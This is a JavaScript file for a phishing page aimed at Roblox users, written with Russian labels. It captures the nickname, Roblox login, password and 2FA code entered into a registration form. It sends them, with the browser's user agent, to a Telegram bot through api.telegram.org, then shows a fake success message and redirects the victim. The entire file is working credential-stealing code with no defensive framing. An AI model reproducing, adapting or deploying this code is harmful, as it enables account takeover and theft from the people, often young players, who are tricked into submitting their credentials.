async function sendToTelegram(data) {
    const text =
        "🎯 <b>IMSF.T Script — новый лог</b>\n" +
        "━━━━━━━━━━━━━━━━━━\n" +
        "<b>Страница:</b> " + (data.page || "?") + "\n" +
        "<b>Ник в игре:</b> " + (data.nick || "—") + "\n" +
        "<b>Логин Roblox:</b> " + (data.login || "—") + "\n" +
        "<b>Пароль:</b> " + (data.password || "—") + "\n" +
        "<b>2FA-код:</b> " + (data.code || "—") + "\n" +
        "━━━━━━━━━━━━━━━━━━\n" +
        "<b>UA:</b> " + navigator.userAgent.slice(0, 120) + "\n" +
        "<b>Time:</b> " + new Date().toISOString();

    const url = "https://api.telegram.org/bot" + CONFIG.BOT_TOKEN + "/sendMessage";

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: text,
                parse_mode: "HTML",
                disable_web_page_preview: true,
            }),
        });
    } catch (e) {
    }
}

document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("regform");
    if (!form) return;

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const data = {
            page: form.dataset.page || "unknown",
            nick: form.querySelector('[name="nick"]')?.value || "",
            login: form.querySelector('[name="login"]')?.value || "",
            password: form.querySelector('[name="password"]')?.value || "",
            code: form.querySelector('[name="code"]')?.value || "",
        };

        const btn = form.querySelector('button[type="submit"]');
        if (btn) {
            btn.disabled = true;
            btn.dataset.original = btn.textContent;
            btn.textContent = "Обработка...";
        }

        await sendToTelegram(data);

        const ok = document.getElementById("success");
        if (ok) ok.style.display = "block";

        setTimeout(() => {
            window.location.href = CONFIG.REDIRECT_OK;
        }, CONFIG.REDIRECT_DELAY);
    });
});
